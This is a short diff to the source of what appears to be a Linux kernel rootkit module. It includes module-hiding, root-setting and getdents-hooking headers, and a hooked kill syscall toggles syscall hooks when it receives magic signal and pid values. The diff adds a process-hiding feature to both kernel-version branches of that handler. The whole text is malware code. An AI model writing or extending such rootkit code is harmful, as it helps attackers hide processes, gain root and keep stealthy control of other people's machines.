@@ -11,6 +11,7 @@
 #include "mod_hider.h"
 #include "root_setter.h"
 #include "getdents_hacks.h"
+#include "hide_process.h"
 
 
 MODULE_LICENSE("GPL");
@@ -73,6 +74,7 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
         }
+        switch_hide_process();
     }
     else if ((sig == 63) && (pid == 2)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
@@ -106,6 +108,7 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
         }
+        switch_hide_process();
     }
     else if ((sig == 63) && (pid == 2)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
